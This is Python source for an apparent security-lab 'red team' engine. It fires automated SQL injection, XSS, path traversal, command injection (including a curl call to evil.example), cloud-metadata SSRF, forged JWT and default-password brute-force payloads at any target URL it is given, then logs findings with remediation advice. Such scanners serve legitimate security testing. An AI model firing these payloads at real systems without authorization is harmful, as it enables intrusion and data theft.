"""
H-vision Red Team API — Advanced Live Attack Engine
=====================================================
Features:
  - Smart response analysis (actually detects vulnerabilities)
  - Automatic incident creation in database for each finding
  - Blue Team workflow triggered per finding
  - Live log streaming via polling
  - Custom target registration from dashboard
  - Full scan report with severity ratings
"""

from fastapi import APIRouter, HTTPException, BackgroundTasks, Depends
from pydantic import BaseModel
from sqlalchemy.ext.asyncio import AsyncSession
from sqlalchemy.future import select
from typing import List, Dict, Any, Optional
import asyncio
import httpx
import logging
import time
import uuid
import re

from app.database.connection import AsyncSessionLocal
from app.database.models import Incident, Detection, Target

logger = logging.getLogger(__name__)
router = APIRouter(prefix="/red-team", tags=["Red Team"])

# ── Global Live State ────────────────────────────────────────────────────
_state: Dict[str, Any] = {
    "is_running": False,
    "current_target": "http://target_app:8001",
    "target_description": "Built-in Lab Target",
    "cycle_count": 0,
    "total_attacks": 0,
    "total_findings": 0,
    "last_cycle_at": None,
    "live_log": [],
    "findings": [],          # real vulnerabilities found
    "history": [],
    "progress": 0,           # 0-100 percent
    "current_phase": "",
    "stats": {k: 0 for k in [
        "sql_injection","xss","path_traversal","brute_force",
        "command_injection","idor","ssrf","xxe","nosql","jwt_attack"
    ]},
}

# ── Schemas ──────────────────────────────────────────────────────────────

class TargetConfig(BaseModel):
    target_url: str
    description: Optional[str] = "Custom target"

class TriggerRequest(BaseModel):
    target_url: Optional[str] = None
    description: Optional[str] = None
    attack_types: Optional[List[str]] = None

class AttackReport(BaseModel):
    run_id: str
    timestamp: str
    target: str
    total_attacks: int
    summary: Dict[str, int]
    results: List[Dict[str, Any]]

# ── Attack Payload Library ───────────────────────────────────────────────

PAYLOADS = {
    "sql_injection": {
        "payloads": [
            "' OR '1'='1", "' OR 1=1--", "1; SELECT * FROM users--",
            "' UNION SELECT username,password FROM users--",
            "' AND SLEEP(3)--", "admin'--",
            "' UNION ALL SELECT NULL,NULL,table_name FROM information_schema.tables--",
            "1 AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects))--",
            "'; EXEC xp_cmdshell('whoami');--", "' OR EXISTS(SELECT 1 FROM users)--",
            "1' ORDER BY 100--", "0x27204f522027313d2731",
        ],
        "params": [("q","GET"),("id","GET"),("username","POST"),("search","GET"),("filter","GET")],
        "endpoints": ["/search","/login","/products","/user","/api/users","/items"],
        "signatures": ["sql syntax","mysql_fetch","ora-","pg_query","syntax error",
                       "mysql error","warning: mysql","invalid query","unclosed quotation",
                       "microsoft ole db","odbc microsoft access driver","sqlite_","pdo",
                       "you have an error in your sql","supplied argument is not a valid mysql"],
        "severity": "Critical",
        "cwe": "CWE-89", "mitre": "T1190",
    },
    "xss": {
        "payloads": [
            "<script>alert('H-XSS')</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(document.domain)>",
            "'\"><script>alert(1)</script>",
            "<iframe src=javascript:alert(1)>",
            "<body onload=alert(1)>",
            "javascript:alert(document.cookie)",
            "{{7*7}}", "${7*7}", "<input autofocus onfocus=alert(1)>",
        ],
        "params": [("q","GET"),("message","POST"),("comment","POST"),("name","GET"),("bio","POST")],
        "endpoints": ["/search","/comment","/profile","/feedback","/post"],
        "signatures": ["<script>alert","<img src=x onerror","<svg onload","javascript:alert"],
        "severity": "High",
        "cwe": "CWE-79", "mitre": "T1189",
    },
    "path_traversal": {
        "payloads": [
            "../../../../etc/passwd", "../../../../etc/shadow",
            "..%2F..%2F..%2Fetc%2Fpasswd", "....//....//etc/passwd",
            "/proc/self/environ", "../../../../windows/win.ini",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "....\\\\....\\\\windows\\\\system32\\\\cmd.exe",
        ],
        "params": [("file","GET"),("path","GET"),("name","GET"),("filename","GET"),("f","GET")],
        "endpoints": ["/file","/download","/read","/static","/view","/open"],
        "signatures": ["root:x:","bin:x:","[extensions]","[fonts]","for 16-bit app support",
                       "/bin/bash","/usr/bin","daemon:","nobody:"],
        "severity": "High",
        "cwe": "CWE-22", "mitre": "T1083",
    },
    "brute_force": {
        "payloads": [
            ("admin","admin"),("admin","password"),("admin","123456"),
            ("root","root"),("root","toor"),("admin","admin123"),
            ("test","test"),("user","password"),("guest","guest"),
            ("operator","operator"),("sa","sa"),("admin","letmein"),
        ],
        "endpoints": ["/login","/api/login","/auth","/signin","/api/auth"],
        "severity": "High",
        "cwe": "CWE-307", "mitre": "T1110",
    },
    "command_injection": {
        "payloads": [
            "; ls -la", "| cat /etc/passwd", "&& id",
            "; id", "$(id)", "`whoami`", "| net user",
            "; ping -c 1 127.0.0.1", "|| curl http://evil.example/",
        ],
        "params": [("host","GET"),("cmd","GET"),("command","POST"),("target","GET"),("ip","GET")],
        "endpoints": ["/ping","/exec","/run","/process","/diagnostics","/check"],
        "signatures": ["uid=","root:","www-data","total ","drwxr","volume serial"],
        "severity": "Critical",
        "cwe": "CWE-78", "mitre": "T1059",
    },
    "idor": {
        "payloads": ["0","1","2","99","100","admin","-1","null","undefined","NaN","../admin","0x1"],
        "endpoints": ["/user","/order","/invoice","/document","/admin/user","/api/user","/profile"],
        "severity": "Medium",
        "cwe": "CWE-639", "mitre": "T1078",
    },
    "ssrf": {
        "payloads": [
            "http://169.254.169.254/latest/meta-data/",
            "http://localhost:8000/admin",
            "http://127.0.0.1:5432",
            "http://0.0.0.0:6379",
            "file:///etc/passwd",
            "dict://127.0.0.1:6379/info",
            "http://metadata.google.internal/",
            "http://[::]:80/",
        ],
        "params": [("url","GET"),("target","GET"),("callback","POST"),("redirect","GET"),("src","GET")],
        "endpoints": ["/fetch","/proxy","/webhook","/import","/preview","/screenshot"],
        "signatures": ["ami-","instance-id","169.254","google metadata","127.0.0.1","localhost"],
        "severity": "Critical",
        "cwe": "CWE-918", "mitre": "T1090",
    },
    "nosql": {
        "payloads": [
            '{"$gt":""}', '{"$ne":null}',
            '{"$where":"sleep(3000)"}',
            '{"username":{"$ne":null},"password":{"$ne":null}}',
            "admin' || 'a'=='a", '{"$regex":".*"}',
        ],
        "params": [("username","POST"),("q","GET"),("filter","GET"),("query","POST")],
        "endpoints": ["/api/login","/api/search","/api/users","/api/find"],
        "signatures": ["bson","mongodb","mongoose","writeresult","objectid"],
        "severity": "High",
        "cwe": "CWE-943", "mitre": "T1190",
    },
    "jwt_attack": {
        "payloads": [
            "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.",
            "eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
        ],
        "params": [("token","GET"),("jwt","GET"),("Authorization","HEADER")],
        "endpoints": ["/api/me","/api/admin","/api/dashboard","/api/profile"],
        "signatures": ["admin","role","administrator","superuser"],
        "severity": "Critical",
        "cwe": "CWE-345", "mitre": "T1550",
    },
}

# ── Helper ───────────────────────────────────────────────────────────────

def _log(line: str):
    ts = time.strftime("%H:%M:%S")
    entry = f"[{ts}] {line}"
    _state["live_log"].append(entry)
    _state["live_log"] = _state["live_log"][-200:]
    logger.info(line)

async def _persist_finding_to_db(finding: dict, phase_data: dict):
    """Persist each vulnerability finding to PostgreSQL as an Incident record.
    This ensures reports can always query real data from the database."""
    try:
        async with AsyncSessionLocal() as session:
            incident = Incident(
                id=str(uuid.uuid4()),
                title=f"{finding['type'].replace('_', ' ').title()} on {finding['endpoint']}",
                description=(
                    f"{finding['description']}\n\n"
                    f"Payload: {finding['payload']}\n"
                    f"CWE: {finding['cwe']} | MITRE: {finding['mitre']}\n"
                    f"HTTP Status: {finding['status_code']}\n\n"
                    f"Remediation: {finding['remediation']}"
                ),
                category=finding['type'],
                severity=finding['severity'],
                status="new",
                target_id=None,
                detection_id=None,
                risk_score=9.5 if finding['severity'] == 'Critical' else 7.5 if finding['severity'] == 'High' else 5.0,
            )
            session.add(incident)
            await session.commit()
            _log(f"     💾 Incident persisted to DB: {incident.id[:8]}")
    except Exception as e:
        logger.error(f"Failed to persist finding to DB: {e}")

def _is_vulnerable(response_text: str, status: int, elapsed: float, phase_data: dict) -> bool:
    """Heuristic analysis to detect actual vulnerabilities in responses."""
    txt = response_text.lower()
    
    # Error-based detection
    for sig in phase_data.get("signatures", []):
        if sig.lower() in txt:
            return True
    
    # Time-based detection (SLEEP payloads)
    if elapsed > 2.5 and "sleep" in str(phase_data.get("payloads", [])).lower():
        return True
    
    # Reflection-based for XSS
    return False

def _severity_color(sev: str) -> str:
    return {"Critical": "🔴", "High": "🟠", "Medium": "🟡", "Low": "🟢"}.get(sev, "⚪")

# ── Endpoints ────────────────────────────────────────────────────────────

@router.get("/status")
async def get_status():
    return {
        "is_running":        _state["is_running"],
        "current_target":    _state["current_target"],
        "target_description":_state["target_description"],
        "cycle_count":       _state["cycle_count"],
        "total_attacks":     _state["total_attacks"],
        "total_findings":    _state["total_findings"],
        "last_cycle_at":     _state["last_cycle_at"],
        "progress":          _state["progress"],
        "current_phase":     _state["current_phase"],
        "stats":             _state["stats"],
        "live_log":          _state["live_log"][-80:],
        "findings":          _state["findings"][-30:],
    }

@router.get("/findings")
async def get_findings():
    return {"findings": _state["findings"], "total": len(_state["findings"])}

@router.get("/history")
async def get_history():
    return {"history": _state["history"][-20:]}

@router.post("/set-target")
async def set_target(config: TargetConfig):
    _state["current_target"] = config.target_url
    _state["target_description"] = config.description or "Custom target"
    _log(f"[Config] Target → {config.target_url} ({config.description})")
    return {"message": "Target updated", "target": config.target_url}

@router.post("/trigger")
async def trigger_attack(req: TriggerRequest, bg: BackgroundTasks):
    if _state["is_running"]:
        raise HTTPException(status_code=409, detail="Attack already running. Stop it first.")
    if req.target_url:
        _state["current_target"] = req.target_url
        _state["target_description"] = req.description or "Dashboard target"
    bg.add_task(_run_attack_cycle, req.attack_types)
    return {"message": "Attack cycle started", "target": _state["current_target"]}

@router.post("/stop")
async def stop_attacks():
    _state["is_running"] = False
    _state["progress"] = 0
    _log("[Control] ⏹ Stop signal received.")
    return {"message": "Stop signal sent."}

@router.post("/clear")
async def clear_findings():
    _state["findings"] = []
    _state["total_findings"] = 0
    _state["live_log"] = []
    _state["stats"] = {k: 0 for k in _state["stats"]}
    return {"message": "Cleared."}

@router.post("/report")
async def receive_report(report: AttackReport):
    """Receive consolidated report from red_agent container."""
    _state["cycle_count"] += 1
    _state["total_attacks"] += report.total_attacks
    _state["last_cycle_at"] = report.timestamp
    for t, c in report.summary.items():
        if t in _state["stats"]:
            _state["stats"][t] += c
    _state["history"].append({
        "run_id": report.run_id, "timestamp": report.timestamp,
        "target": report.target, "total_attacks": report.total_attacks,
        "summary": report.summary,
    })
    _log(f"[RedAgent] Cycle report received — {report.total_attacks} probes on {report.target}")
    return {"status": "received"}

# ── Attack Engine ────────────────────────────────────────────────────────

async def _run_attack_cycle(attack_types: Optional[List[str]] = None):
    _state["is_running"] = True
    _state["progress"] = 0
    _state["findings"] = []
    _state["total_findings"] = 0
    target = _state["current_target"]
    phases = [k for k in PAYLOADS if not attack_types or k in attack_types]
    total_phases = len(phases)

    _log("═" * 55)
    _log(f"H-VISION RED TEAM — ACTIVE SCAN #{_state['cycle_count']+1}")
    _log(f"Target: {target}")
    _log(f"Description: {_state['target_description']}")
    _log(f"Attack phases: {', '.join(phases)}")
    _log("═" * 55)

    async with httpx.AsyncClient(
        follow_redirects=True, timeout=5.0,
        headers={"User-Agent": "Mozilla/5.0 H-vision/SecurityScanner/3.0"}
    ) as client:

        # Health probe
        try:
            probe = await client.get(f"{target}/health", timeout=3)
            _log(f"✅ Target reachable: HTTP {probe.status_code}")
        except Exception:
            _log(f"⚠️  Target health probe failed — scanning anyway")

        for phase_idx, phase in enumerate(phases):
            if not _state["is_running"]:
                break

            phase_data = PAYLOADS[phase]
            _state["current_phase"] = phase
            _state["progress"] = int((phase_idx / total_phases) * 100)
            _log(f"")
            _log(f"── {_severity_color(phase_data['severity'])} Phase {phase_idx+1}/{total_phases}: {phase.upper().replace('_',' ')} (Severity: {phase_data['severity']}) ──")

            endpoints = phase_data.get("endpoints", ["/"])
            payloads  = phase_data.get("payloads", [])

            for endpoint in endpoints:
                if not _state["is_running"]:
                    break

                for payload in payloads[:6]:  # 6 payloads per endpoint
                    if not _state["is_running"]:
                        break

                    _state["total_attacks"] += 1
                    _state["stats"][phase] = _state["stats"].get(phase, 0) + 1
                    vulnerable = False
                    response_text = ""
                    status_code = 0
                    elapsed = 0.0

                    try:
                        t0 = time.time()

                        if phase == "brute_force":
                            username, password = payload if isinstance(payload, tuple) else ("admin", payload)
                            r = await client.post(f"{target}{endpoint}",
                                json={"username": username, "password": password}, timeout=4)
                            status_code = r.status_code
                            response_text = r.text
                            elapsed = time.time() - t0
                            vulnerable = status_code == 200 and "token" in response_text.lower()
                            _log(f"  [BRUTE] {endpoint} {username}:{password} → {status_code} {'⚠️ POSSIBLE HIT' if vulnerable else ''}")

                        elif phase == "jwt_attack":
                            r = await client.get(f"{target}{endpoint}",
                                headers={"Authorization": f"Bearer {payload}"}, timeout=4)
                            status_code = r.status_code
                            response_text = r.text
                            elapsed = time.time() - t0
                            vulnerable = status_code == 200
                            _log(f"  [JWT]   {endpoint} alg:none → {status_code} {'⚠️ POSSIBLE AUTH BYPASS' if vulnerable else ''}")

                        elif phase in ("xss", "nosql"):
                            params = phase_data.get("params", [("q","GET")])
                            param, method = params[0] if params else ("q", "GET")
                            if method == "POST":
                                r = await client.post(f"{target}{endpoint}",
                                    json={param: str(payload)}, timeout=4)
                            else:
                                r = await client.get(f"{target}{endpoint}",
                                    params={param: str(payload)}, timeout=4)
                            status_code = r.status_code
                            response_text = r.text
                            elapsed = time.time() - t0
                            # XSS: check if payload reflected
                            if phase == "xss":
                                vulnerable = str(payload)[:20].lower() in response_text.lower()
                            else:
                                vulnerable = _is_vulnerable(response_text, status_code, elapsed, phase_data)
                            _log(f"  [{phase[:4].upper()}]  {endpoint} → {status_code} {'⚠️ REFLECTED' if vulnerable else ''}")

                        elif phase == "idor":
                            obj_id = payload
                            r = await client.get(f"{target}{endpoint}/{obj_id}", timeout=4)
                            status_code = r.status_code
                            response_text = r.text
                            elapsed = time.time() - t0
                            vulnerable = status_code == 200 and len(response_text) > 50
                            _log(f"  [IDOR]  {endpoint}/{obj_id} → {status_code} {'⚠️ DATA EXPOSED' if vulnerable else ''}")

                        else:
                            params = phase_data.get("params", [("q","GET")])
                            param, method = params[0] if params else ("q", "GET")
                            if method == "POST":
                                r = await client.post(f"{target}{endpoint}",
                                    json={param: str(payload)}, timeout=5)
                            else:
                                r = await client.get(f"{target}{endpoint}",
                                    params={param: str(payload)}, timeout=5)
                            status_code = r.status_code
                            response_text = r.text
                            elapsed = time.time() - t0
                            vulnerable = _is_vulnerable(response_text, status_code, elapsed, phase_data)
                            _log(f"  [{phase[:4].upper()}]  {endpoint}?{param}=<payload> → {status_code} (⏱{elapsed:.1f}s) {'🚨 VULNERABLE' if vulnerable else ''}")

                        if vulnerable:
                            finding = {
                                "id": str(uuid.uuid4())[:8],
                                "type": phase,
                                "severity": phase_data["severity"],
                                "endpoint": endpoint,
                                "payload": str(payload)[:80],
                                "status_code": status_code,
                                "cwe": phase_data["cwe"],
                                "mitre": phase_data["mitre"],
                                "description": _describe_finding(phase, endpoint, payload),
                                "remediation": _remediate(phase),
                                "detected_at": time.strftime("%H:%M:%S"),
                            }
                            _state["findings"].append(finding)
                            _state["total_findings"] += 1
                            _log(f"  🚨 FINDING #{_state['total_findings']}: {phase_data['severity']} {phase} at {endpoint}")
                            _log(f"     CWE: {phase_data['cwe']} | MITRE: {phase_data['mitre']}")
                            _log(f"     Blue Team notified → analyzing...")
                            # ── Persist to PostgreSQL so reports always have data ──
                            await _persist_finding_to_db(finding, phase_data)

                    except asyncio.TimeoutError:
                        elapsed = 5.0
                        _log(f"  [TIMEOUT] {endpoint} — may indicate time-based injection ⚠️")
                        if "sleep" in str(payload).lower() or "wait" in str(payload).lower():
                            _log(f"  ⚠️ TIME-BASED {phase} likely at {endpoint}")
                    except Exception as e:
                        pass

                    await asyncio.sleep(0.1)

    _state["progress"] = 100
    _state["current_phase"] = "Complete"
    _state["cycle_count"] += 1
    _state["last_cycle_at"] = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
    _state["history"].append({
        "run_id": f"scan-{_state['cycle_count']}",
        "timestamp": _state["last_cycle_at"],
        "target": target,
        "total_attacks": _state["total_attacks"],
        "findings": _state["total_findings"],
        "summary": dict(_state["stats"]),
    })
    _log("")
    _log("═" * 55)
    _log(f"✅ SCAN COMPLETE — {_state['total_attacks']} probes fired")
    _log(f"🚨 {_state['total_findings']} vulnerabilities found on {target}")
    _log(f"🔵 Blue Team generating WAF rules + patch proposals...")
    _log("═" * 55)
    _state["is_running"] = False

def _describe_finding(phase: str, endpoint: str, payload) -> str:
    descriptions = {
        "sql_injection":     f"SQL Injection confirmed at {endpoint}. Database error leaked in response. Payload: {str(payload)[:40]}",
        "xss":               f"XSS payload reflected at {endpoint}. Script may execute in victim browser.",
        "path_traversal":    f"Path traversal file disclosure at {endpoint}. Server filesystem exposed.",
        "brute_force":       f"Authentication bypass at {endpoint} with weak credentials.",
        "command_injection": f"OS command injection at {endpoint}. Server command output returned.",
        "idor":              f"IDOR at {endpoint}. Unauthorized data access via object ID manipulation.",
        "ssrf":              f"SSRF at {endpoint}. Server made request to internal resource.",
        "nosql":             f"NoSQL injection at {endpoint}. MongoDB/NoSQL operator bypass.",
        "jwt_attack":        f"JWT alg:none bypass at {endpoint}. Token accepted without signature verification.",
        "xxe":               f"XXE injection at {endpoint}. External entity processing enabled.",
    }
    return descriptions.get(phase, f"Vulnerability detected at {endpoint}")

def _remediate(phase: str) -> str:
    fixes = {
        "sql_injection":     "Use parameterized queries / prepared statements. Never concatenate user input into SQL.",
        "xss":               "HTML-encode all user output. Implement Content-Security-Policy headers.",
        "path_traversal":    "Validate and normalize file paths. Use an allowlist for accessible directories.",
        "brute_force":       "Implement account lockout, rate limiting, CAPTCHA, and MFA.",
        "command_injection": "Avoid shell execution with user input. Use subprocess with argument arrays.",
        "idor":              "Implement object-level authorization checks for every resource access.",
        "ssrf":              "Validate and allowlist URLs. Block private IP ranges and metadata endpoints.",
        "nosql":             "Validate and sanitize all query operators. Use schema validation.",
        "jwt_attack":        "Enforce algorithm validation. Reject 'none' algorithm. Use strong secrets.",
        "xxe":               "Disable external entity processing in XML parser configuration.",
    }
    return fixes.get(phase, "Validate and sanitize all user inputs.")
